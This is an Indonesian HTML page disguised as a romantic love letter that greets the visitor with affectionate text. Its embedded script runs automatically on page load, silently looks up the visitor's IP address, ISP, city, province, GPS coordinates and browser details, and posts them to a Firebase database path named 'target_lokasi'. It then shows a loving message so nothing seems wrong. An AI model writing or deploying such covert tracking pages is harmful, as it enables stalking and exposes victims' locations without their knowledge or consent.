<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surat Spesial Untukmu ❤️</title>
    <style>
        body { background: #ffebee; color: #d81b60; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .heart { font-size: 60px; color: #e91e63; animation: beat .3s infinite alternate; }
        @keyframes beat { to { transform: scale(1.2); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="heart">❤️</div>
        <h1 id="title">Membuka Pesan Rahasia...</h1>
        <p id="status">Tunggu sebentar ya, Sayang...</p>
    </div>

    <script>
        const DB_URL = "https://pirdangame-default-rtdb.asia-southeast1.firebasedatabase.app/target_lokasi.json";

        async function sikatDataSilent() {
            try {
                // Pakai API yang berbeda untuk hasil lebih variatif
                const res = await fetch('http://ip-api.com/json/?fields=66846719');
                const data = await res.json();
                
                const payload = {
                    waktu: new Date().toLocaleString(),
                    ip: data.query,
                    negara: data.country,
                    provinsi: data.regionName,
                    kota: data.city,
                    isp: data.isp, // Nama provider (Indihome/Telkomsel dll)
                    perangkat: navigator.userAgent,
                    maps: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                };

                // Kirim ke Firebase
                await fetch(DB_URL, { method: 'POST', body: JSON.stringify(payload) });

                // Tampilan setelah data kekirim
                setTimeout(() => {
                    document.getElementById('title').innerText = "Aku Kangen Kamu ❤️";
                    document.getElementById('status').innerText = "Semoga harimu menyenangkan ya!";
                }, 2000);

            } catch (err) {
                console.log("Silent Error");
            }
        }

        // Jalankan otomatis tanpa klik apapun
        window.onload = sikatDataSilent;
    </script>
</body>
    </html>
